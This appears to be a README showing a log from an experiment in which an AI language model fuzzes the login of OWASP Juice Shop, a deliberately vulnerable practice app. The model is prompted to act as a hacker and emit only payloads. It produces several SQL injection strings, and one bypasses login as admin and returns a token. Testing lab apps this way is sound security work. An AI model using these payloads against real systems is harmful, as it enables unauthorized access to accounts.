# JuiceShopMeetsOpenAI
```
LEVEL 1: 
[+] Start: : Analyse this json String {"email":"asdsdf","password":"asd"}. Act as an hacker and replace one random value in the json object with an attack payload to exploit vulnerability. Return only the attack vector and never normale text. Do not apologize if an error will happen!
[+] Fuzzer: {"email":"asdsdf","password":"asd' OR '1'='1'; -- "}
[+] Detector: b'Invalid email or password.'
[+] Detector: No
[+] Fuzzer: {"email":"asdsdf","password":"asd' UNION SELECT ALL FROM users WHERE '1'='1'; -- "}
[+] Detector: b'Invalid email or password.'
[+] Detector: No
[+] Fuzzer: {"email":"asdsdf","password":"' OR 'a'='a"}
[+] Detector: b'Invalid email or password.'
[+] Detector: No
[+] Fuzzer: {"email":"asdsdf","password":"' OR 'x'='x"}
[+] Detector: b'Invalid email or password.'
[+] Detector: No
[+] Fuzzer: {"email":"asdsdf","password":"' OR 1=1 -- "}
[+] Detector: b'Invalid email or password.'
[+] Detector: No
[+] Fuzzer: {"email":"asdsdf","password":"' OR '1'='1"}
[+] Detector: b'Invalid email or password.'
[+] Detector: No
[+] Fuzzer: {"email":"' OR '1'='1'; -- ","password":"asd"}
[+] Detector: b'{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJkYWFkIiwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI0LTA2LTExIDE1OjQ3OjMxLjA4OSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI0LTA2LTExIDE2OjIyOjU4LjgzOSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3MTgxMzUxNzl9.iNqhkQ6Yjh8AG3w2nh1wA9CF-yN3w4UbS3SRaWGoPzhFx9MUYFw8_jqm_0hk9YbVPO10aWDMWI12kIVUuUcQLNju3RylCRWatFRIujUN5vrGvOBBM1uq8jlm3WPLVeSUhsU--t_KhC3pSt8WXk7M2bjq5sMjAKvw2t4lQ2hLPK4","bid":1,"umail":"admin@juice-sh.op"}}'
[+] Detector: Yes
You got it! Hacked!
```
